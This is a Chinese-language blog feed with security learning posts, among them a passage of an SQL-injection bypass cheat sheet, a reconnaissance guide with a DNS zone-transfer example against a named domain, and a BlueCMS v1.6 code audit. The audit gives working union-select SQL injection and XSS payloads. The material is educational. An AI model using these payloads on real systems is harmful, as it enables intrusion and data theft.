class="line">or  -&gt; ||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">空格</span><br><span class="line"></span><br><span class="line">%09 TAB键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return功能</span><br><span class="line">%0b TAB键（垂直）</span><br><span class="line">%a0 空格</span><br><span class="line">&#x2F;**&#x2F;</span><br></pre></td></tr></table></figure><p><strong>长度限制</strong></p><p>(1) regexp() 正则匹配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">例1：匹配存在f的记录</span><br><span class="line">peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例2：匹配存在xxx的字段</span><br><span class="line">username&#x3D;mochu7&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)&amp;&amp;(column_name)regexp(&#39;^r&#39;))),1))#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">regexp(&#39;^r&#39;)&#96;是MySql的正则，&#96;^r&#96;匹配开头是r的字段，也就是&#96;column_name&#x3D;real_flag_1s_her</span><br></pre></td></tr></table></figure><p>(2) reverse() 逆序函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>关键词限制</strong></p><p>(1)mysqli_real_escape_string() 转义特殊字符</p><p>​        使用16进制绕过 0x75</p><h2 id="不同数据库的检测"><a href="#不同数据库的检测" class="headerlink" title="不同数据库的检测"></a>不同数据库的检测</h2><p>MySQL</p><p>Oracle</p><p>SQLServer</p><p>PostgreSQL</p><h2 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h2><ul><li><p>宽字节注入</p></li><li><p>无列名注入</p></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;p&gt;概述：web应用程序对用户&lt;strong&gt;输入数据控制不严格&lt;/strong&gt;，导致用户输入数据被&lt;strong&gt;拼</summary>
      
    
    
    
    <category term="Red" scheme="http://example.com/categories/Red/"/>
    
    <category term="常见web漏洞" scheme="http://example.com/categories/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/04/28/hello-world/"/>
    <id>http://example.com/2021/04/28/hello-world/</id>
    <published>2021-04-28T07:22:11.871Z</published>
    <updated>2021-04-28T07:22:11.871Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集</title>
    <link href="http://example.com/2021/03/16/Red/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2021/03/16/Red/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-03-15T18:39:49.000Z</published>
    <updated>2021-05-26T02:12:12.671Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="网络入口-信息"><a href="#网络入口-信息" class="headerlink" title="网络入口/信息"></a>网络入口/信息</h3><ul><li><p>网络拓扑信息</p></li><li><p>IP信息</p><ul><li>C段</li></ul></li><li><p>线下网络</p><ul><li>Wi-Fi</li></ul></li><li><p>VPN</p></li><li><p>邮件网关</p></li><li><p>资产、手机APP、小程序</p></li><li><p>SSO 单点登录</p></li><li><p>边界网络设备</p></li><li><p>上游运营商</p></li></ul><h3 id="DNS信息收集"><a href="#DNS信息收集" class="headerlink" title="DNS信息收集"></a>DNS信息收集</h3><blockquote><p>主要关注域名或注册商，管理员联系方式，电话和邮箱，子域名等信息。</p></blockquote><h4 id="whois查询"><a href="#whois查询" class="headerlink" title="- whois查询"></a>- whois查询</h4><p>​    主要作用：<strong>查询域名注册信息</strong></p><p>​    whois协议：查询域名或 IP 所有者信息的传输协议，WHOIS 服务是由注册商和注册局来提供</p><p>​    具体查询内容：网站创建时间，管理员联系方式，地址(管理员可以屏蔽)</p><p>​    工具：</p><p>​     (1)集成在kali的whois</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whois domain格式</span><br><span class="line">whois testfire.net测试网站</span><br><span class="line">whois vulnweb.com   测试网站</span><br></pre></td></tr></table></figure><p>​    (2)站长之家进行whois 查询[<a href="http://whois.chinaz.com]">http://whois.chinaz.com]</a></p><p>​        这里通过whois查询之后还可以继续进行邮箱反查、注册人反查、电话反查</p><p>​         Ps：如果查询结果数量多，考虑可能是公用的，丢弃该查询(一般小公司都是在云上的，大多是为公用)</p><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="- 子域名查询"></a>- 子域名查询</h4><p>方法：</p><p>(1)查询子域名的网站（科学上网）：<a href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com</a></p><p>(2)通过查看证书获取：浏览器URL的前面的安全锁，-安全证书-详细信息-使用者备用名称</p><p>(3)工具爆破</p><ul><li><p>子域名挖掘机 Layer</p></li><li><p>Kali集成工具 dnsrecon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnsrecon -d vulnweb.com -D &#x2F;root&#x2F;tmp&#x2F;dic&#x2F;dns.dic -t brt</span><br><span class="line">-d 指定域名 -D 指定字典 -t 指定模式</span><br></pre></td></tr></table></figure></li></ul><h4 id="域传送漏洞"><a href="#域传送漏洞" class="headerlink" title="- 域传送漏洞"></a>- 域传送漏洞</h4><p>简单描述：某服务器(备份服务器)发起请求主服务器，但中间不做身份认证</p><p>危害：匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露</p><p>开启了53端口</p><p>方法</p><p>(1) dig 工具</p><p>第一步：找到解析域名的 dns 服务器（Server服务器）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dig thnu.edu.cn ns</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">thnu.edu.cn.        2185    IN  NS  DNS1.thnu.edu.cn.</span><br></pre></td></tr></table></figure><p>第二步: 然后向该域名发送axfr 请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dig axfr @dns1.thnu.edu.cn thnu.edu.cn</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Debian &lt;&lt;&gt;&gt; axfr @dns1.thnu.edu.cn thnu.edu.cn</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">thnu.edu.cn.        3600    IN  SOA dns1.thnu.edu.cn. root.thnu.edu.cn. 2017102704 30 30 360 3600</span><br><span class="line">thnu.edu.cn.        3600    IN  NS  dns1.thnu.edu.cn.</span><br><span class="line">thnu.edu.cn.        3600    IN  MX  0 mail.thnu.edu.cn.</span><br><span class="line">admin.thnu.edu.cn.  3600    IN  A   172.16.200.11</span><br><span class="line">admissions.thnu.edu.cn. 3600    IN  A   222.160.127.36</span><br></pre></td></tr></table></figure><p>(2) dnsenum工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsenum testfire.net</span><br></pre></td></tr></table></figure><p>获取信息：子域名信息</p><p>​                    子域名对应IP地址</p><h4 id="DNS2IP"><a href="#DNS2IP" class="headerlink" title="- DNS2IP"></a>- DNS2IP</h4><p>概述：通过DNS 解析找到真实IP地址</p><p>方法：</p><p>(1)ping</p><p>​    可能结果为非真实IP</p><p>(2) kali 集合 <strong>dnsenum</strong> 工具<strong>（推荐）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsenum testfire.net</span><br></pre></td></tr></table></figure><p>​    返回信息完整，且自动检测是否存在域传送漏洞</p><p>(3)站长工具</p><p>​    DNS查询</p><p>PS：注意CDN加速问题</p><p>CDN是内容分发网络，主要是进行节点缓存。假设我们访问目标为美国网站，为了能快速访问，在中国有个服务器进行了内容缓存。我们看到的美国网站，实际访问的是中国IP网站。<strong>通过DNS查询到的IP不是真实IP</strong></p><p>——————————————————–———–———–———–</p><p>用户　　→　　　CDN 网络　　　→　　一台或多台真实机器</p><p>↗　　CDN Server 1　　↘<br>用户　　→　　CDN Server 2　　→　　真实机器<br>↘　　CDN Server N　　↗</p><p>——————————————————–———–———–———–</p><h4 id="IP查询"><a href="#IP查询" class="headerlink" title="- IP查询"></a>- IP查询</h4><p>主要工具：站长之家</p><p>​        查询IP-&gt;获取经纬度-&gt;GPS定位获取物理地址</p><h4 id="CDN"><a href="#CDN" class="headerlink" title="- CDN"></a>- CDN</h4><p>（1）校验是否为真实IP</p><p>网站使用了 CND 技术，会导致查询结果错误，可以考虑通过多地Ping方式确定是否使用了CDN</p><p>查询网站：</p><ul><li><p><code>http://ping.chinaz.com/</code></p></li><li><p><code>https://asm.ca.com/en/ping.php</code></p></li></ul><p><strong>（2）通过CND的域名的查找</strong></p><p>使用了CDN的域名的父域或者子域名不一定使用了CDN，可以通过这种方式去查找对应的IP。</p><p><strong>（3）历史记录查找</strong></p><p>CDN可能是在网站上线一段时间后才上线的，可以通过查找域名解析记录的方式去查找真实IP。</p><h4 id="一些重要记录"><a href="#一些重要记录" class="headerlink" title="- 一些重要记录"></a>- 一些重要记录</h4><p><strong>（1）CNAME</strong></p><p>Canonical name，又称alias，<strong>将域名指向另一个域名</strong>。其中可能包含其他<strong>关联业务的信息</strong>。很多网站使用的CDN加速功能利用了该记录。</p><p><strong>（2）MX记录</strong></p><p>Mail Exchanger，记录了发送电子邮件时域名对应的服务器地址。可以用来<strong>寻找SMTP服务器信息</strong>。</p><p><strong>（3）NS记录</strong></p><p>Name Server，记录是<strong>域名服务器的记录</strong>，用来指定域名由哪个DNS服务器来进行解析。</p><p><strong>（4） SPF记录</strong></p><p>Sender Policy Framework 是为了防止垃圾邮件而提出来的一种DNS记录类型，是一种TXT类型的记录，用于登记某个域名拥有的用来外发邮件的所有IP地址。通过SPF记录可以获取相关的IP信息，常用命令为 <code>dig example.com txt</code> 。</p><h3 id="搜索引擎信息收集"><a href="#搜索引擎信息收集" class="headerlink" title="搜索引擎信息收集"></a>搜索引擎信息收集</h3><blockquote><p>搜索方向：网站目录结构、sql注入、phpinfo、phpstudy、php探针、网站指纹</p><p>网站指纹包括应用名、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据等。</p></blockquote><h4 id="Google-Hacking语法"><a href="#Google-Hacking语法" class="headerlink" title="- Google Hacking语法"></a>- Google Hacking语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">site: 域名</span><br><span class="line">inurl：  url包含内容</span><br><span class="line">link： 包含目标链接的页面</span><br><span class="line">related：与目标站点“相似”的页面(模板)</span><br><span class="line">intitle：</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="- 网络空间搜索引擎"></a>- 网络空间搜索引擎</h4><p>fofa、shodan、钟馗之眼</p><h3 id="站点信息收集"><a href="#站点信息收集" class="headerlink" title="站点信息收集"></a>站点信息收集</h3><blockquote><p>收集指纹信息</p></blockquote><h4 id="收集内容"><a href="#收集内容" class="headerlink" title="-  收集内容"></a>-  收集内容</h4><ul><li><p>判断网站操作系统</p></li><li><p>扫描敏感文件</p><ul><li>robots.txt</li><li>crossdomain.xml</li><li>sitemap.xml</li><li>xx.tar.gz</li><li>xx.bak</li></ul></li><li><p>确定网站采用语言</p><ul><li>PHP / Java / Python</li></ul></li><li><p>前端框架</p><ul><li>jQuery / BootStrap / Vue / React / Angular（查看源码）</li></ul></li><li><p>中间件服务器</p><ul><li>如 Apache / Nginx / IIS 等</li><li>查看header中的信息</li><li>根据报错信息判断</li><li>根据默认页面判断</li></ul></li><li><p>web容器服务器</p><ul><li>如Tomcat / Jboss / Weblogic等</li></ul></li><li><p>后端框架</p><ul><li>Cookie判断、图片hash值判断、URL路由判断、关键字、X-Powered-By头</li></ul></li><li><p>CDN信息</p></li><li><p>WAF</p></li><li><p>敏感目录+信息泄露</p></li></ul><h4 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="- CMS指纹识别"></a>- CMS指纹识别</h4><p>（1）在线识别</p><ul><li><p>whatweb：<a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></p><p>Kail自带了whatweb   <code>whatweb IP</code></p></li></ul><p>（2）利用工具</p><p>​    火狐插件：Netcraft Extension    Wappalyzer</p><p>（3）手工识别</p><ul><li>根据HTTP响应头判断，重点关注X-Powered-By、cookie等字段</li><li>网站页面专属标志判断</li><li>根据HTML 特征，重点关注一些&lt;meta&gt;标签</li></ul><h4 id="敏感目录-文件收集"><a href="#敏感目录-文件收集" class="headerlink" title="- 敏感目录/文件收集"></a>- 敏感目录/文件收集</h4><p>(1)目录扫描</p><ul><li><p>dirsearch工具</p></li><li><p>御剑</p></li><li><p>Burp 的 intruder 模块 fuzz 字典爆破</p></li><li><p>kali 自带 dir</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb &quot;IP&quot; &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;big.txt |common.txt</span><br></pre></td></tr></table></figure></li><li><p>DirBuster工具包(kali自带)</p></li></ul><h4 id="WAF识别与绕过"><a href="#WAF识别与绕过" class="headerlink" title="- WAF识别与绕过"></a>- WAF识别与绕过</h4><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><p>（1）Kali 集合工具 wafw00f</p><p>​    WAF 指纹识别的工具。</p><p>流程：正常的HTTP请求识别-&gt;恶意的HTTP请求通过简单的逻辑推断-&gt;分析之前返回的响应，使用算法猜测</p><p>（2）手工识别</p><p>例如：安全狗，在响应包里会有WAF/2.0或者Safedog的标o</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;h3 id=&quot;网络入口-信息&quot;&gt;&lt;a href=&quot;#网络入口-信息&quot; class=&quot;headerlink&quot; title=&quot;网络入</summary>
      
    
    
    
    <category term="Red" scheme="http://example.com/categories/Red/"/>
    
    <category term="信息收集" scheme="http://example.com/categories/Red/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>第一次的代码审计--BlueCMS代码审计</title>
    <link href="http://example.com/2020/11/06/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/BlueCMS/"/>
    <id>http://example.com/2020/11/06/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/BlueCMS/</id>
    <published>2020-11-05T22:00:00.000Z</published>
    <updated>2021-05-26T02:41:39.811Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一次的代码审计–BlueCMS代码审计"><a href="#第一次的代码审计–BlueCMS代码审计" class="headerlink" title="第一次的代码审计–BlueCMS代码审计"></a>第一次的代码审计–BlueCMS代码审计</h1><blockquote><p>之前总说要学习代码审计，但每次面对大量代码时，又没什么开发经验，都是浅尝即止，面对几千行的代码毫无开始的头绪。（看来又印证了那句话：基础决定上层建筑）作为萌新 最开始我还是先去看了许多大佬的文章，了解一下他们的学习路线，并且学习了一些新的思路。这次挑了个小众的CMS入手–BlueCMS作为我的代码审计开始，顺便分享一些自己的总结。</p></blockquote><p>环境配置：</p><blockquote><p>BlueCMS v1.6 sp1</p><p>windows7</p><p>PHP 5.4.45 + Apache +mysql 5.7.26</p></blockquote><h1 id="0x01-项目结构分析"><a href="#0x01-项目结构分析" class="headerlink" title="0x01 项目结构分析"></a>0x01 项目结构分析</h1><p>/admin  存放有关后台管理员的所有文件</p><p>/api       api接口设置</p><p>/data</p><p>/images   存放图片样式文件</p><p>/include  包含全局的文件 </p><p>​                函数定义文件、数据库配置、通用过滤配置文件、文本编辑器、支付界面、插件、</p><p>/install   网站安装路径</p><p>/js  存放js文件</p><p>/temlates  存放一些前端的静态模板文件</p><p>/uc_client</p><h1 id="0x02-开始审计"><a href="#0x02-开始审计" class="headerlink" title="0x02 开始审计"></a>0x02 开始审计</h1><p>1、先对配置文件进行了审计</p><p><code>include/common.inc.php</code>文件</p><p>(1)查看是否对输入输出进行限制</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201016104239346.png" alt="image-20201016104239346"></p><p>存在统一过滤，必对带有单引号的变量值进行转义</p><p>先判断是否开启了<code>get_magic_quotes_gpc()</code> 如果没有的话会用自定义的函数<code>deep_addslashes</code>对预定义字符进行加反斜杠处理</p><p>PS：这里还是自定义的函数过滤更多</p><p><strong>漏洞：</strong>进行源码分析发现其实对输入输出还是有遗漏</p><p>未对传入的$_SERVER值进行检测（伪造client-ip和x-forwarded-for)</p><p>PS：可以全局搜索看看getip类似的函数名，查看代码如何获取ip，是否有利用点</p><h1 id="0x03-漏洞点"><a href="#0x03-漏洞点" class="headerlink" title="0x03 漏洞点"></a>0x03 漏洞点</h1><h2 id="ad-js-php存在sql注入"><a href="#ad-js-php存在sql注入" class="headerlink" title="ad_js.php存在sql注入"></a>ad_js.php存在sql注入</h2><blockquote><p>页面功能介绍：在后台管理中模块管理的添加广告所涉及的功能</p></blockquote><p>在文件<code>common.inc.php</code>中对网站的输入有统一的过滤方法，</p><p>对<code>$_post、$_get、$_cookies和$_request</code>统一进行数据处理。代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$_POST</span> = deep_addslashes(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$_GET</span> = deep_addslashes(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="variable">$_COOKIES</span> = deep_addslashes(<span class="variable">$_COOKIES</span>);</span><br><span class="line"><span class="variable">$_REQUEST</span> = deep_addslashes(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS：具体的可以再看看之前写的</p><p>对ad_js.php的源码进行审计，通过$_GET[] 获取ad_id的值，直接拼接执行sql语句</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201026155049426.png" alt="image-20201026155049426"></p><p>追踪函数<code>getone()</code>，是自定义的函数，代码在<code>mysql.class.php</code>中，用来查询数据库，代码如下：<img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201026155513060.png" alt="image-20201026155513060"></p><p><strong>利用：</strong></p><p>尝试直接对ad_js.php页面进行注入测试</p><p>因为是int型注入 直接拼接sql语句，判断出字段数有7个，且只显示第7个字段的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_js.php?ad_id&#x3D;3 union select 1,2,3,4,5,6,7</span><br></pre></td></tr></table></figure><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201026160006222.png" alt="image-20201026160006222"></p><p>当执行语句错误时（直接显示sql语句）</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201026160159096.png" alt="image-20201026160159096"></p><hr><p>已经知道数据库的字段数和显示位，并且开发者并未做过多的WAF防御，那么我们就可以执行任意sql语句了</p><p>例：</p><p><strong>爆破当前数据库的表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_js.php?ad_id&#x3D;3 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure><p><strong>获取各表中的字段</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_js.php?ad_id&#x3D;3 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name&#x3D;0x626C75655F6164</span><br></pre></td></tr></table></figure><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201026161410137.png" alt="image-20201026161410137"></p><p>PS：因为这里对单引号进行了过滤 需要将表名转成16进制进行查询</p><h2 id="个人用户注册存在反射型xss攻击"><a href="#个人用户注册存在反射型xss攻击" class="headerlink" title="个人用户注册存在反射型xss攻击"></a>个人用户注册存在反射型xss攻击</h2><blockquote><p>定位：user.php?act=reg</p></blockquote><p>访问user.php，会先接受两个变量$act和$from，后端根据act的参数进行执行动作</p><p>当<code>$act</code>值为 <code>reg</code>时，<code>from</code>的值会渲染到前端页面<code>value=&#39;&#39;</code>中 ,从而导致xss攻击</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201026204026526.png" alt="image-20201026204026526"></p><p>因为在全局配置文件中本身就使用了<code>addslashes</code>对字符进行过滤，但影响不大，构造语句进行拼接触发xss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user.php?act&#x3D;reg&amp;from&#x3D;&quot;&#x2F;&gt;&lt;button onclick&#x3D;alert(1)&gt;&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user.php?act&#x3D;reg&amp;from&#x3D;&quot;&gt;&lt;img src&#x3D;&#39;&#39; onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="个人资料编辑存在存储型xss"><a href="#个人资料编辑存在存储型xss" class="headerlink" title="个人资料编辑存在存储型xss"></a>个人资料编辑存在存储型xss</h2><blockquote><p>定位：user.php的邮箱参数</p></blockquote><p>该漏洞有两个地方都可以触发</p><ul><li>注册账号</li><li>修改个人资料</li></ul><p>通过代码审计和黑盒测试发现，在对email值进行添加或修改时，直接Post进数据库，未对其做任何过滤和检测，从而引起的xss。其他的都做了限制（例如 限制账号和密码长度）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user_name</span> =!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user_name&#x27;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&#x27;user_name&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$pwd</span>       = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$pwd1</span>    = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd1&#x27;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd1&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$email</span>     = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$safecode</span>  = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;safecode&#x27;</span>]) ? trim(<span class="variable">$_POST</span>[<span class="string">&#x27;safecode&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$from</span> = !<span class="keyword">empty</span>(<span class="variable">$from</span>) ? base64_decode(<span class="variable">$from</span>) : <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$user_name</span>) &lt; <span class="number">4</span> || strlen(<span class="variable">$user_name</span>) &gt; <span class="number">16</span>)&#123;</span><br><span class="line">showmsg(<span class="string">&#x27;用户名字符长度不符&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$pwd</span>) &lt; <span class="number">6</span>)&#123;</span><br><span class="line">showmsg(<span class="string">&#x27;密码不能少于6个字符&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pwd</span> != <span class="variable">$pwd1</span>)&#123;</span><br><span class="line">showmsg(<span class="string">&#x27;两次输入密码不一致&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strtolower(<span class="variable">$safecode</span>) != strtolower(<span class="variable">$_SESSION</span>[<span class="string">&#x27;safecode&#x27;</span>]))&#123;</span><br><span class="line">showmsg(<span class="string">&#x27;验证码错误&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT * FROM &quot;</span>.table(<span class="string">&#x27;user&#x27;</span>).<span class="string">&quot; WHERE user_name=&#x27;<span class="subst">$user_name</span>&#x27;&quot;</span>))&#123;</span><br><span 